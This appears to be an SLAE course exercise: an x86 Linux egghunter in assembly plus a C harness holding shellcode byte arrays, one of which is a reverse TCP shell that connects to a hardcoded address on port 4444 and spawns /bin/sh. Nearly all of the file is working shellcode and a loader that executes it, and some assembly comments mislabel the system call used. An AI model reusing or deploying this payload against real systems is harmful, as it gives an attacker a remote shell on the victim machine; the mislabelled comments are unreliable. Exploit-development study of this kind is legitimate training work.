/*
;Auther: H4554n AlMusajjen
;Title: 86x Egghunter
;SLAE - 1057
global _start

section .text

_start:
	mov ebx, 0x50905090
	xor ecx,ecx
	mul ecx
PageInc:
	or dx,0xfff
AddrInc:
	inc edx
	pushad
	lea ebx,[edx+4]
	mov al,0x21	;system call to connect()
	int 80h
	cmp al,0xf2	;check if we have EFAULT
	popad
	jz PageInc	;if access() gave us EFAULT then go to next page
	cmp [edx],ebx	;check if EGG in the mm0 register
	jnz AddrInc 	;EGG wasn't found
	cmp [edx+4],ebx	;re check if EGG replica is there just to make sure
	jne AddrInc	;just a lucky instruction was found looking as same as your egg we will continue searching
	jmp edx		;EGG has been found 3>_3> in both [edx][edx+4]
*/
#include<stdio.h>
#include<string.h>

#define EGG "\x90\x50\x90\x50"
unsigned char egghunter[]= \
"\xbb\x90\x50\x90\x50\x31\xc9\x99\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
unsigned char code[] = \
EGG EGG
"\x31\xdb\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\xa3\x80\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

unsigned char test[] = 
"\x31\xd2"
"\x66\x81\xca\xff\x0f"
"\x42"
"\x8d\x5a\x04"
"\x6a\x21"
"\x58"
"\xcd\x80"
"\x3c\xf2"
"\x74\xee"
"\xb8" EGG
"\x89\xd7"
"\xaf"
"\x75\xe9"
"\xaf"
"\x75\xe6"
"\xff\xe7";
int main()
{

printf("Shellcode Length:  %d\n", (int)strlen(egghunter));

int (*ret)() = (int(*)())egghunter;

ret();

}
